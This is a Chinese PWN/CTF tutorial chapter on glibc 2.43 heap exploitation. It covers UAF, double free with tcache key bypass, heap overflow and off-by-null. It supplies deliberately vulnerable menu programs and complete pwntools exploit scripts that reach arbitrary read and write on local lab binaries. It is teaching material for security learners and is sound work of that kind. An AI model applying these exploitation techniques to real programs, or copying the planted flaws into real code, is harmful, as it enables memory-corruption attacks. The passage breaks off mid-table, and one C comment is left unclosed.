# P13 基础堆漏洞
## Basic Heap Exploitation

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L3 堆上利用期 ｜ **前置要求**：[[P12-glibc堆管理机制|P12]] · [[P10-整数溢出与off-by-one|P10]]
> **本章目标**：把堆上四类基础漏洞——UAF、double free、堆溢出、off-by-null——从漏洞成因讲到利用原语，每类配一个自建的菜单堆题和完整的利用脚本；压轴用 off-by-null 走通"清标志位 → 构造 chunk overlapping → 泄露 → 任意地址分配 → getshell"的完整链条。

[[P12-glibc堆管理机制|P12]] 把堆管理器的结构讲透了：chunk 怎么切、bins 怎么登记、malloc/free 按什么流程走。本章开始动它——堆漏洞的共同姿势是==让程序在管理元数据上出错，再把错误兑换成读写原语==。四类基础漏洞对应四种出错方式，难度递进：

| 漏洞 | 一句话成因 | 拿到的原语 | 本章节 |
| ---- | ---- | ---- | ---- |
| UAF | free 之后指针不清零 | 读、写已释放的块 | 第 2 节 |
| double free | 同一块入队两次 | 同一块拿到两个指针（别名） | 第 3 节 |
| 堆溢出 | 写入长度超过块的大小 | 越界改写邻居的元数据 | 第 4 节 |
| off-by-null | 字符串收尾 `\0` 出界一格 | 清掉邻居的 PREV_INUSE，构造 chunk overlapping | 第 5 节 |

所有程序与利用都按本机 glibc 2.43 的行为讲解。市面老题解默认 2.27/2.31 的环境，差异集中列在第 6 节的对照表里——读老题解先查那张表，[[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的注记在这里全部生效。

## 1. 菜单堆题：堆漏洞的标准舞台

### 1.1 为什么 CTF 堆题都长一个样

[[P12-glibc堆管理机制#1. 为什么堆是现代 PWN 的主战场|P12 第 1 节]]描绘过典型堆题的形状：new 分配、edit 编辑、free 释放、show 打印。这个形状不是巧合，它同时服务三方：

- **漏洞的入口是管理逻辑，不是某一行危险函数**。栈题的入口常常一行 `gets` 就交代了（[[P10-整数溢出与off-by-one|P10]] 开篇的对照）；`malloc`/`free` 自己不会越界，可乘之机藏在 create/edit/delete 的实现细节里——指针清没清、长度查没查、边界差多少。菜单结构把这几段逻辑摆在同一层，审起来一目了然。
- **堆利用需要多步编排**。[[P12-glibc堆管理机制#5. free 的主干流程|P12 第 5 节]]的 warning 说得明白：tcache 档没满就没有合并；布局一档要按 16 次释放来算。攻击者的动作是长长的一串"分配、释放、编辑、再分配"，菜单程序恰好提供这样的命令式接口——一锤子输入的栈题给不了这个舞台。
- **全局指针数组是天然的落点**。程序靠 `slots[idx]` 访问块，数组本身在 bss、无 PIE 时地址固定（[[P04-Linux安全缓解机制|P4]]）。本章第 2、4、5 节三次把 malloc 指到这个数组上——一次写入就能接管所有槽位指针，等价于"任意地址读写"。

show 的存在意义也要说一句：它是泄露窗口。堆上没有任何输出通道的题目几乎不可利用——至少要一个读原语，把管理器写进块体的字段带出来。

### 1.2 本章靶子程序

```c
/* p13_menu.c —— 标准菜单堆题，本章主靶子（x86-64 Linux）
 * create：malloc(size) 存进 slots[idx]，读入内容
 * edit  ：按创建时的 size 重写内容
 * show  ：打印槽位内存的前 8 字节
 * delete：free(slots[idx]) —— 指针不清空（UAF）
 * 程序不打印任何地址：想拿地址，只能靠漏洞自己泄露。
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void *slots[8];
int sizes[8];

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    for (;;) {
        int op, idx, size;
        printf("1.create 2.edit 3.show 4.delete >> ");
        if (scanf("%d", &op) != 1) return 0;
        printf("idx >> ");
        if (scanf("%d", &idx) != 1) return 0;
        if (idx < 0 || idx > 7) { puts("bad idx"); continue; }
        if (op == 1) {
            printf("size >> ");
            if (scanf("%d", &size) != 1) return 0;
            if (size <= 0 || size > 0x500) { puts("bad size"); continue; }
            slots[idx] = malloc(size);
            sizes[idx] = size;
            printf("data >> ");
            if (read(0, slots[idx], size) <= 0) return 0;
        } else if (op == 2) {
            if (!slots[idx]) { puts("empty"); continue; }
            printf("data >> ");
            if (read(0, slots[idx], sizes[idx]) <= 0) return 0;
        } else if (op == 3) {
            if (!slots[idx]) { puts("empty"); continue; }
            write(1, slots[idx], 8);
            puts("");
        } else if (op == 4) {
            if (!slots[idx]) { puts("empty"); continue; }
            free(slots[idx]);          /* 指针不清空：悬垂指针 */
        }
    }
    return 0;
}
```

```bash
gcc -O0 -fno-pie -no-pie -g p13_menu.c -o p13_menu
```

它的功能实现每一处都"规矩"：create 有尺寸上限、edit 按创建时的长度写、show 只读 8 字节、下标有越界检查。唯一的缺陷是 delete 释放后 `slots[idx]` 不清零——这是真实堆题里最高产的缺陷，第 2、3 节都在它上面做。第 4、5 节会换两个靶子，各自只留一种缺陷。

### 1.3 交互脚本骨架

四道功能对应四个交互函数，每个 exploit 的开头都是这一段。收发函数的语义见 [[P05-pwntools与GDB插件工具链#3. 连接与输入输出：process、remote 与一套收发函数|P5 第 3 节]]：

```python
from pwn import *
from sys import argv

context.log_level = 'info'
elf = ELF(argv[1] if len(argv) > 1 else './p13_menu', checksec=False)
p = process(argv[1] if len(argv) > 1 else './p13_menu', stderr=STDOUT)

def create(idx, size, data):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    p.sendlineafter(b'size >> ', str(size).encode())
    p.sendafter(b'data >> ', data)

def edit(idx, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    p.sendafter(b'data >> ', data)

def show(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    return p.recvn(8)      # 8 字节之后紧跟下一轮菜单提示符，留给 sendlineafter 匹配

def delete(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'idx >> ', str(idx).encode())
```

三个写法各有理由：

- ==每次都等提示符再发==。程序里 `scanf`（走 stdio 缓冲）与 `read`（直读文件描述符）混用，一次把几行输入全发出去，scanf 会把管道里当时已有的整批数据一并吸进缓冲区，后面的 read 反而等不到数据——机理与 [[P10-整数溢出与off-by-one#2. 模式一：有符号长度检查被负数绕过|P10 第 2 节]]的折叠框同款。逐提示符同步后，管道里永远只有"当前这一行"。
- **data 用 `sendafter` 而不是 `sendlineafter`**。data 是原始字节，不带换行——`read(0, buf, size)` 收到多少算多少，凑满 `size` 字节或遇到管道空了就返回。
- **show 只收 8 字节就停**。

> [!info]- show 之后为什么不能补一个 recvline
> 程序 show 一次输出的是"8 字节 + 一个换行 + 下一轮菜单提示符"，底层常常一次到达、挤在同一个缓冲区里。`recvn(8)` 恰好取走 fd 槽的 8 字节；若顺手再接一个 `recvline()` 想吃掉换行，会把换行连同整行菜单提示符一起吞进返回值——下一轮 `sendlineafter(b'>> ')` 在缓冲区里再也找不到提示符，脚本原地卡死。收发函数读的是字节流的当前位置，不是"程序的一次输出"，这个分层 [[P05-pwntools与GDB插件工具链#2. context：一次设定，全局生效|P5 第 2 节]]的 debug 日志演示过。

第 2、3 节的 exploit 直接复用这四个函数，不再重复列出；第 4、5 节换了靶子，交互函数有出入（create 的返回值、show 的窗口），届时在各自脚本里完整带出。

## 2. UAF：free 之后指针还活着

### 2.1 悬垂指针的两种后果

`free(slots[idx])` 之后 `slots[idx]` 原样保留——它成了悬垂指针，指向一块管理器已经在使用的内存。两种后果，都是攻击面：

- **show 读它**：块入队时，管理器把 fd 与 key 写进块体的前 16 字节（[[P12-glibc堆管理机制#3.1 tcache：第一优先的线程缓存|P12 3.1]]）——show 打印的前 8 字节恰好就是 fd 槽。==读已释放的块 = 读管理器的链表字段 = 泄露==。
- **edit 写它**：fd 槽在用户数据区的第 0 字节，edit 照样可写。==写已释放的块 = 改管理器的链表==——tcache 弹出时对解密出来的 next 只查对齐、不查指向，改 fd 等于直接指挥下一次 malloc 的去向（[[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 第 3 节]]的结论）。

一道题只要"free 后不清指针"加上"edit 或 show 不检查块还活着"，这两条通道就全开。本章靶子正是这样。

### 2.2 泄露：show 读出残留的 fd

先看链为空时的形状。create 两块 0x88（chunk 0x90），free 掉第一块——这是本线程第一次 free，tcache 结构在这里才诞生（[[P12-glibc堆管理机制#5. free 的主干流程|P12 第 5 节]]第 5 步），随后 A 头插进空链。空链的存储值按 [[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 3.2]]的式 14.1 是"槽位置 >> 12"——[[P12-glibc堆管理机制#8. 一条 malloc/free 序列的全程跟踪|P12 第 8 节]] B 阶段那个不像指针的小数。A 是第一个分配，chunk 固定在堆区起点，所以这个值左移 12 位就是堆基址，==一次 show 同时完成堆地址泄露==。

再 free 第二块，链变成 `B -> A`，此时 show(B) 读到的是 A 的加密值。异或量 `(槽位置 >> 12)` 上一步已经到手（A、B 同页），一次异或即可还原——解密公式的推导与"同页弱点"都在 [[P14-tcache与fastbin利用#3.3 第二步：解密 safe-linking，还原真值|P14 3.3]]，不重讲。

### 2.3 改写：edit 悬垂指针 = 改 tcache 链

往 B 的 fd 槽写一个伪造值，链就从 `B -> A` 变成 `B -> 目标`。两个要点：写入值必须按同一公式加密（写明文等于写了一个错地址）；目标地址必须 0x10 对齐（弹出时的对齐检查）。这两条的完整展开、弹出目标的两个副作用、以及"任意地址分配"之后往哪里写，都是 [[P14-tcache与fastbin利用|P14]]的主线——本节把链路走通，兑换环节交给它。

### 2.4 完整利用

交互函数用 1.3 的骨架，利用主体如下：

```python
# exp_uaf.py —— UAF：泄露堆地址 → 改 fd → tcache 复用（交互函数接 1.3）
# ---- 1. 布局：两块 0x90 ----
create(0, 0x88, b'A'*8)
create(1, 0x88, b'B'*8)

# ---- 2. free(A) 后 show：残留的 fd 槽就是 safe-linking 的空链形状 ----
delete(0)
leak1 = u64(show(0))
heap_base = leak1 << 12
a_mem = heap_base + 0x10          # A 是第一个分配：chunk 在堆起点
b_mem = heap_base + 0xa0
print('[泄露1] A 的 fd 槽 = %#x（空链形状，即堆页号）' % leak1)
print('[泄露1] 堆基址     = %#x' % heap_base)

# ---- 3. free(B) 后 show：读到的是 A 的加密值，一次异或还原 ----
delete(1)
leak2 = u64(show(1))
next_real = leak2 ^ (b_mem >> 12)
print('[泄露2] B 的 fd 槽 = %#x → 还原下一块 = %#x' % (leak2, next_real))
assert next_real == a_mem, '解密结果与推导的 A 地址不符'

# ---- 4. edit(B)：把链改成 B -> &slots[0]，写入要加密 ----
tgt = elf.symbols['slots']        # &slots[0]，bss 地址，无 PIE 固定
print('[目标] &slots[0] = %#x' % tgt)
assert tgt % 16 == 0, '目标必须 0x10 对齐'
edit(1, p64(tgt ^ (b_mem >> 12)))

# ---- 5. 两次 create：第二次把 &slots[0] 当块交付 ----
create(2, 0x88, b'C'*8)           # 弹出 B
create(3, 0x88, p64(b_mem))       # 弹出 &slots[0]，写入 p64(b_mem) → slots[0] = b_mem

# ---- 6. 验证：edit(0) 落在 B 的地界上，show(0) 读得回 ----
edit(0, p64(0x4141414141414141))
val = u64(show(0))
print('[复用] 第 2 次 create 把 &slots[0] 当成块交付：slots[0] 现指向 B')
print('[复用] edit(0) 的写入落在 B 上，show(0) 读回 = %#x' % val)
assert val == 0x4141414141414141
print('[完成] 任意地址读写原语到手')
```


三处值得停一下：

- **泄露的推导在脚本里自证**：第 3 步还原出的 `0x24e33010` 与"堆基址 + 0x10"的推导一致，assert 挡住了"解密公式用错"这类静默错误。做堆题时给每个泄露值配一条这样的对账，坏值会在第一步暴露，而不是拖到 getshell 前莫名崩溃。
- **落点选了 `slots[0]`**：malloc 把它当块交付后，create 自带的数据读入正好写进 `slots[0]` 本身——一次分配把"槽位指针"变成任意值。此后 `edit(0)`/`show(0)` 就是对任意地址的写与读。
- **弹出目标的管理器副作用**：取出 `&slots[0]` 时，key 清零动作会把 `slots[0]+8` 也就是 `slots[1]` 写成 NULL。本例没再使用槽 1，无碍；选落点时的这套检查清单在 [[P14-tcache与fastbin利用#3.4 第三步：伪造 fd，把目标挂进链|P14 3.4]]的 warning 里。

## 3. double free：同一块 free 两次

### 3.1 key 检测：第二堵墙

[[P12-glibc堆管理机制#3.1 tcache：第一优先的线程缓存|P12 3.1]]交代过字段：块入队时在 mem+8 处写入一个进程内随机的 key；free 时若发现待释放块的 key 等于它，就全表核查，确认重复直接终止。对攻击者意味着：==同一块连续 free 两次，程序当场 abort==，报错排在 free 流程的靠前位置。靶子上拍下现场：

```python
# exp_df_abort.py —— 同一块 free 两次的报错现场（交互函数接 1.3）
create(0, 0x18, b'A'*8)
delete(0)
delete(0)
print('--- 程序输出 ---')
print(p.recvall(timeout=3).decode(errors='replace'), end='')
```

输出：

```text
--- 程序输出 ---
free(): double free detected in tcache 2
```

### 3.2 绕过：把 key 改掉再 free

检测的触发条件是"key 相等"——==相等才扫描全表，不相等检测直接跳过==。而 key 就写在块体的 mem+8 处，靶子的 edit 碰得到它（第 2 节的 UAF 写原语）。绕过序列：

```text
free(A)          链：A            （A 的 fd 槽 = 空链形状，key = 随机值）
free(B)          链：B -> A       （A 压到链尾，key 不变）
edit(A)          fd 槽原样写回，key 槽改成任意别的值
free(A)          key 不再命中 → A 第二次入队：链 A -> B -> A
```

两个细节：

- edit 的 0x10 字节会同时盖住 fd 与 key——==fd 必须原样写回==（空链形状的存储值就是第 2 节泄露的堆页号，手里现成），否则链在第二次入队后就断在垃圾值上；key 则随便写。
- 第二次入队后链成了环：`A -> B -> A -> B -> ...`。管理器的容量账本没乱（每入队一次减一），乱的是链本身——==同一块从此可以被取出任意多次==。

> [!info]- 老版本的 key 与 A-B-A
> 2.29–2.33 的 key 不是随机数，而是 tcache 结构的地址——堆上读得到、可预测，老题解有"预测 key 直接二次 free"的打法。2.34 起换成随机值（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]），改 key（本节）或让该档装满换道（[[P14-tcache与fastbin利用#7. tcache stashing unlink attack：2.43 上依然成立\|P14 第 7 节]]）是 2.43 上的两条正路。至于老教材的 fastbin A-B-A——三连 free 只查链头——fastbin 已在 2.43 整体移除（[[P12-glibc堆管理机制#3.6 fastbin：已经退场的经典机制\|P12 3.6]]），第三下会直接撞上本节的 key 检测，现场在 [[P14-tcache与fastbin利用#5.5 同一份源码回到 2.43\|P14 5.5]]。

### 3.3 完整利用：同一块拿到两次

```python
# exp_df_bypass.py —— 改 key 后同一块入队两次（交互函数接 1.3）
# ---- 1. 布局：A、B 两块 0x20；A 是第一个分配 ----
create(0, 0x18, b'A'*8)
create(1, 0x18, b'B'*8)

# ---- 2. 泄露堆页号（UAF 的 show，第 2 节的手法）----
delete(0)
leak = u64(show(0))
heap_base = leak << 12
a_mem = heap_base + 0x10
b_mem = heap_base + 0x30
print('[泄露] A 的 fd 槽 = %#x → 堆基址 = %#x' % (leak, heap_base))

# ---- 3. free(A); free(B)：链 B -> A，A 压在链尾 ----
delete(1)
# ---- 4. edit(A)：fd 槽保持空链形状的存储值，key 槽改掉 ----
edit(0, p64(leak) + p64(0xcafebabe))
print('[改写] A 的 key 已改成 0xcafebabe')

# ---- 5. 再 free(A)：key 不再命中，A 第二次入队 ----
delete(0)
print('[入队] A 入队两次，链：A -> B -> A')

# ---- 6. 三次 create：第 1、3 次拿回同一块 ----
create(2, 0x18, b'1'*0x10)        # 弹出 A
create(3, 0x18, b'2'*0x10)        # 弹出 B
create(4, 0x18, b'3'*0x10)        # 又弹出 A —— 同一块被分配两次
edit(2, b'\x42'*0x10)             # 经槽 2 写 A 的地界
val = u64(show(4))                # 槽 4 也指向 A：读回同一内容
print('[别名] 槽 2 与槽 4 同指一块：edit(2) 写入，show(4) 读回 = %#x' % val)
assert val == 0x4242424242424242
print('[完成] 同一块到手两次，别名指针成立')
```

```text
[改写] A 的 key 已改成 0xcafebabe
[入队] A 入队两次，链：A -> B -> A
```

槽 2 与槽 4 指向同一段内存：经槽 2 的写入在槽 4 读得回——==别名（alias）成立==。别名比 UAF 的悬垂指针更稳：悬垂指针的读写窗口取决于程序下次何时复用那块地界，别名则是两个都在册的合法槽位，随时可写、随时可读。改其中一个的 fd，从另一个读的就是改过的链——double free 由此成为 tcache poisoning 的另一个入口，兑换环节同样在 [[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 第 3 节]]。

## 4. 堆溢出：越界写进邻居的地界

### 4.1 溢出能写到哪

堆上相邻的 chunk 紧挨着，一块的数据区写满之后再往后写，落点就是下一个 chunk 的头部。设 A、B 相邻（A 在低地址），A 的 edit 越界时盖到的是：

```text
  A_chunk              A_mem                       B_chunk       B_mem
     │                  │                              │             │
     ▼                  ▼                              ▼             ▼
     ├────────┬─────────┴──────────────┬───────────────┬─────────────┴───┬─────────┐
     │ 0x91   │ A 的用户数据（0x88 字节）│ B 的 prev_size │ B 的 size = 0x91 │ B 的 fd  │ …
     └────────┴────────────────────────┴───────────────┴─────────────────┴─────────┘
                └── edit(A) 越界 0x10 字节：8 字节盖 size，8 字节盖 fd ──┘
```

三样东西，两样有用：B 的 **prev_size**（A 在用时归 A 的数据用，盖了也只是数据）；B 的 **size**（第 5 节的主角，本节先保持原值）；B 的 **fd**——==若 B 已被 free 进 tcache，这里就是链上的下一跳==。改 fd 就是指挥 malloc（第 2 节的结论原样适用），而这一次不需要任何 UAF：==溢出本身就是写原语==。

### 4.2 靶子程序

```c
/* p13_overflow.c —— 堆溢出演示程序（x86-64 Linux）
 * create：malloc(size)，打印地址，读入内容
 * edit  ：固定读 0x100 字节 —— 超过小块的实际大小（漏洞点）
 * show  ：打印槽位内存的前 8 字节
 * delete：free 并清空指针（无 UAF）
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void *slots[8];
int sizes[8];

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    for (;;) {
        int op, idx, size;
        printf("1.create 2.edit 3.show 4.delete >> ");
        if (scanf("%d", &op) != 1) return 0;
        printf("idx >> ");
        if (scanf("%d", &idx) != 1) return 0;
        if (idx < 0 || idx > 7) { puts("bad idx"); continue; }
        if (op == 1) {
            printf("size >> ");
            if (scanf("%d", &size) != 1) return 0;
            if (size <= 0 || size > 0x500) { puts("bad size"); continue; }
            slots[idx] = malloc(size);
            sizes[idx] = size;
            printf("mem = %p\ndata >> ", slots[idx]);
            if (read(0, slots[idx], size) <= 0) return 0;
        } else if (op == 2) {
            if (!slots[idx]) { puts("empty"); continue; }
            printf("data >> ");
            read(0, slots[idx], 0x100);      /* 漏洞：固定长度，不查 sizes[idx] */
        } else if (op == 3) {
            if (!slots[idx]) { puts("empty"); continue; }
            write(1, slots[idx], 8);
            puts("");
        } else if (op == 4) {
            if (!slots[idx]) { puts("empty"); continue; }
            free(slots[idx]);
            slots[idx] = NULL;
        }
    }
    return 0;
}
```

缺陷是 edit 的读入长度写死 0x100——对 0x88 的小块意味着越界 0x10 字节。注意这个程序的两处不同：delete 会清指针（==没有 UAF，fd 只能靠溢出碰==）；create 会打印分配地址（题目主动给地址的场景，泄露这步就省了）。

### 4.3 完整利用

```python
# exp_ov.py —— 堆溢出：越界改写已释放邻居的 fd → 指定地址分配
from pwn import *
from sys import argv

context.log_level = 'info'
BIN = argv[1] if len(argv) > 1 else './p13_overflow'
elf = ELF(BIN, checksec=False)
p = process(BIN, stderr=STDOUT)

def create(idx, size, data):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    p.sendlineafter(b'size >> ', str(size).encode())
    p.recvuntil(b'mem = ')
    mem = int(p.recvline().strip(), 16)     # 本程序打印地址：顺手接住
    p.sendafter(b'data >> ', data)
    return mem

def edit(idx, data):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    p.sendafter(b'data >> ', data)

def show(idx):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'idx >> ', str(idx).encode())
    return p.recvn(8)

def delete(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'idx >> ', str(idx).encode())

# ---- 1. 布局：A、B 相邻（地址由程序打印）----
a_mem = create(0, 0x88, b'A'*8)
b_mem = create(1, 0x88, b'B'*8)
print('[布局] A = %#x  B = %#x  相邻（B_chunk = A_mem + 0x80）' % (a_mem, b_mem))

# ---- 2. free(B)：B 进 tcache[0x90]，fd 槽 = 空链形状 ----
delete(1)

# ---- 3. edit(A)：固定 0x100 长度，0x98 字节越过 chunk 边界 ----
#     0x88 字节填 A 的数据；8 字节盖 B 的 size（写回原值 0x91）；8 字节盖 B 的 fd
tgt = elf.symbols['slots']
assert tgt % 16 == 0
print('[目标] &slots[0] = %#x' % tgt)
edit(0, b'J'*0x88 + p64(0x91) + p64((b_mem >> 12) ^ tgt))

# ---- 4. 两次 create：第二次把 &slots[0] 当块交付，写入 &slots[6] ----
m1 = create(2, 0x88, b'C'*8)              # 弹出 B
print('[分配] 第 1 次 malloc = %#x（应为 B）' % m1)
assert m1 == b_mem
m2 = create(3, 0x88, p64(tgt + 6*8))      # 弹出 &slots[0]，写入 &slots[6] → slots[0] 指向槽位 6
print('[分配] 第 2 次 malloc = %#x（&slots[0] 被当成 mem）' % m2)
assert m2 == tgt

# ---- 5. 验证：edit(0) 写的是 slots[0] 指的地方 = 指针数组本身 ----
edit(0, p64(a_mem))                       # slots[6] = A 的地址：从未 create 过的槽位被赋值
val = u64(show(6))                        # show(6) 读 A 的内容 = 溢出时填的 'J'
print('[验证] slots[6] = %#x，show(6) 读回 = %#x（溢出时填的 J）' % (a_mem, val))
assert val == 0x4a4a4a4a4a4a4a4a
print('[完成] 无 UAF：溢出本身就是写原语，任意地址读写到手')
```

输出：

```text
[布局] A = 0xc7c6010  B = 0xc7c60a0  相邻（B_chunk = A_mem + 0x80）
[目标] &slots[0] = 0x404080
[分配] 第 1 次 malloc = 0xc7c60a0（应为 B）
[分配] 第 2 次 malloc = 0x404080（&slots[0] 被当成 mem）
[验证] slots[6] = 0xc7c6010，show(6) 读回 = 0x4a4a4a4a4a4a4a4a（溢出时填的 J）
[完成] 无 UAF：溢出本身就是写原语，任意地址读写到手
```

三处说明：

- **越界载荷的排布**是 `0x88 数据 + p64(0x91) + p64(加密 fd)`：0x88 字节填满 A 的数据区，接着 8 字节正好压在 B 的 size 槽上（写回原值 `0x91`，理由见下方折叠框），最后 8 字节落在 B 的 fd 槽。加密用的异或量 `(b_mem >> 12)` 由程序打印的地址直接算出。
- **写入也要加密**：fd 的存储值是 `目标 ^ (存储位置 >> 12)`，直接写明文等于把一个错地址挂进链。公式与常见错法 [[P14-tcache与fastbin利用#3.4 第三步：伪造 fd，把目标挂进链|P14 3.4]]。
- **验证环节又用了一次指针数组**：第 4 步写入的值是 `&slots[6]`，于是 `edit(0)` 的落点变成指针数组本身，把从未 create 过的槽 6 赋成了 A 的地址——槽位指针被攻击者接管，读写随之而动。

> [!info]- size 槽写回原值的讲究
> tcache 的入队与出队都不读 size 槽，盖成垃圾字节同样能跑。但 size 槽是 size 链的推进依据（[[P12-glibc堆管理机制#7.2 heapview：沿 size 链走一遍|P12 7.2]]的 heapview 沿它走），写回原值 `0x91` 让 GDB 里的堆现场保持可读——用 [[P12-glibc堆管理机制#7. 调试方法：GDB 原生加自写堆观察脚本|P12 第 7 节]]的脚本对账时不会被自己的载荷带偏。第 5 节的 off-by-null 则相反：==要的就是 size 槽被改==，那里才见真章。

### 4.4 路线图

| 环节 | 内容 |
| ---- | ---- |
| 触发条件 | 写入长度与块的实际大小脱节：长度写死、阈值抄错、或长度本身可控但检查缺失 |
| 获得的原语 | 越界改写相邻 chunk 的元数据；邻居已 free 时改 fd = 无 UAF 的 tcache poisoning |
| 通向 getshell | 与第 2 节同路：任意地址分配（[[P14-tcache与fastbin利用#8. 拿到任意地址之后写哪里\|P14 第 8 节]]落点表）→ system（[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]）；邻居在用时改 size，则进入第 5 节的 overlapping 世界 |

## 5. off-by-null 与 chunk overlapping

### 5.1 堆版 off-by-null：收尾 \0 出界一格

[[P10-整数溢出与off-by-one|P10]]第 8 节讲过栈版的 off-by-null：`strcpy` 一族复制 `strlen(src)+1` 字节，收尾的 `\0` 恰好比缓冲区多写一格，落在保存的 rbp 的最低字节上。同样的"补 \0 出界"搬到堆上，落点换成了==下一个 chunk 的 size 槽的最低字节==——这一字节里住着 PREV_INUSE 标志位（[[P12-glibc堆管理机制#2. chunk：堆内存的基本单位|P12 第 2 节]]）。

先纠正一个几乎人人都会先犯的直觉错误：==低位清零只会让 size 变小或清掉标志位，不会"进位"出更大的值==。size 槽是一个 64 位整数，补进来的 `\0` 把最低字节清零——0x91 的有效位全在最低字节里，清完直接归零：

```c
/* obn_small.c —— 收尾 \0 落在 0x90 块的 size 槽上，size 变成什么 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    setbuf(stdout, NULL);
    char *a = malloc(0x88), *b = malloc(0x88);
    printf("b.size raw before = %#lx\n", *(unsigned long *)(b - 8));
    memset(a, 'E', 0x88);
    ((char *)a)[0x88] = '\0';            /* 收尾 \0 正好落在 b 的 size 低位 */
    printf("b.size raw after  = %#lx\n", *(unsigned long *)(b - 8));
    free(b);                             /* size 已被清零：free 当场终止 */
    return 0;
}
```

输出：

```text
b.size raw before = 0x91
b.size raw after  = 0
free(): invalid size
```

==off-by-null 的靶子必须是大块==。0x90 量级的块（raw 0x91）被清一个字节就报废；raw 0x501 这样的大块，最低字节只有标志位——清零后 size 不变（0x500）、PREV_INUSE 归零，这正是攻击要的形状。老教材常见的 raw 0x421 → 0x400（缩 0x20 加清标志）是同一件事的另一个用法。本节用 0x4f8 的申请值（chunk 0x500，raw 0x501）。

### 5.2 靶子程序

```c
/* p13_obn.c —— off-by-null 演示程序（x86-64 Linux）
 * create：malloc(size) 后读入，再在"实际读到的字节数"处补一个 '\0'
 *         ——读满 size 字节时，这个 '\0' 恰好落在下一个 chunk 的 size 槽上
 * edit  ：同上，按创建时的 size 重写并补 '\0'
 * show  ：打印槽位内存的前 0xf8 字节（窗口比一块大，能读到邻居）
 * delete：free 并清空指针（无 UAF）

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void *slots[8];
int sizes[8];
char pad[0x200];               /* 落点后方的预留空地 */

static void readn(char *buf, int n) {
    int r = (int)read(0, buf, n);
    if (r < 0) r = 0;
    buf[r] = '\0';             /* 收尾补 '\0'：读满 n 时正好出界一格 */
}

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    for (;;) {
        int op, idx, size;
        printf("1.create 2.edit 3.show 4.delete >> ");
        if (scanf("%d", &op) != 1) return 0;
        printf("idx >> ");
        if (scanf("%d", &idx) != 1) return 0;
        if (idx < 0 || idx > 7) { puts("bad idx"); continue; }
        if (op == 1) {
            printf("size >> ");
            if (scanf("%d", &size) != 1) return 0;
            if (size <= 0 || size > 0x500) { puts("bad size"); continue; }
            slots[idx] = malloc(size);
            sizes[idx] = size;
            printf("data >> ");
            readn((char *)slots[idx], sizes[idx]);
        } else if (op == 2) {
            if (!slots[idx]) { puts("empty"); continue; }
            printf("data >> ");
            readn((char *)slots[idx], sizes[idx]);
        } else if (op == 3) {
            if (!slots[idx]) { puts("empty"); continue; }
            write(1, slots[idx], 0xf8);
            puts("");
        } else if (op == 4) {
            if (!slots[idx]) { puts("empty"); continue; }
            free(slots[idx]);
            slots[idx] = NULL;
        }
    }
    return 0;
}
```

缺陷在 `readn` 的收尾：读到多少字节，就把 `'\0'` 补在哪——读满 `size` 时正好出界一格。这模仿的是字符串函数的习惯写法，与 P10 第 8 节的 `strcpy` 同源。delete 清指针、无 UAF：==fd 的唯一写通道就是这一次越界的 `\0`==。

> [!info]- show 的窗口为什么是 0xf8
> 本节第 3 步的堆地址泄露要从"邻居家"读一个 8 字节字段，show 的窗口得盖得到那里——0xf8 比 0x88 的块大，正好读进下一块。真实题目里这个读原语形态各异（show 整块、edit 支持读回、或多打印几个字节），窗口大小只影响"读哪个偏移"，不影响攻击结构。bss 里的 `pad` 是落点的预留空地：弹出目标的 key 清零、create 的收尾 `\0` 都会往落点的相邻字节写，落点选在指针数组附近时，多出来的这一两字节由 `pad` 一带兜底，不至于踩坏承重变量。

### 5.3 构造 overlapping：清 PREV_INUSE + backward merge

布局四块，全按 0x10 对齐的 chunk 排开：

```text
 heap+0x000         heap+0x500        heap+0xa00    heap+0xa90
     │                 │                 │             │
     ▼                 ▼                 ▼             ▼
     ├── A (0x500) ────┼─── B (0x500) ───┼─ C (0x90) ─┼─ D (0x90) ──┬ tcache ─┬ top ─┤
     A_mem = +0x10     B_mem = +0x510
     假块 P 落在 A 的数据区（+0x10），size 报 0x4f0，恰好接到 B_chunk
```

攻击分五步，每步都标出管理器的哪条规则在被利用：

| 步 | 动作 | 利用的规则 |
| ---- | ---- | ---- |
| 1 | free(D)，经 show(C) 读出 D 的 fd 槽 | 空链形状的存储值 = 槽位置 >> 12 = 堆页号（第 2 节同款） |
| 2 | edit(A) 写 0x4f8 字节：A 的数据区里伪造假块 P，末尾补的 `\0` 清掉 B 的 PREV_INUSE | A 的数据区一直延伸到 B_chunk（prev_size 借用），收尾 `\0` 落在 B 的 size 低位：0x501 → 0x500 |
| 3 | free(B)——==合法的一次释放== | size 0x500 超出 tcache 范围，free 走合并路径；PREV_INUSE = 0 触发后向合并（[[P12-glibc堆管理机制#6.1 后向合并：PREV_INUSE 为 0 时吃掉前块\|P12 6.1]]） |
| 4 | 后向合并按 B 的 prev_size 找"前块"：P = B_chunk − 0x4f0 = A_mem，unlink(P) | unlink 的三道检查全部由伪造数据满足，见下方对照表 |
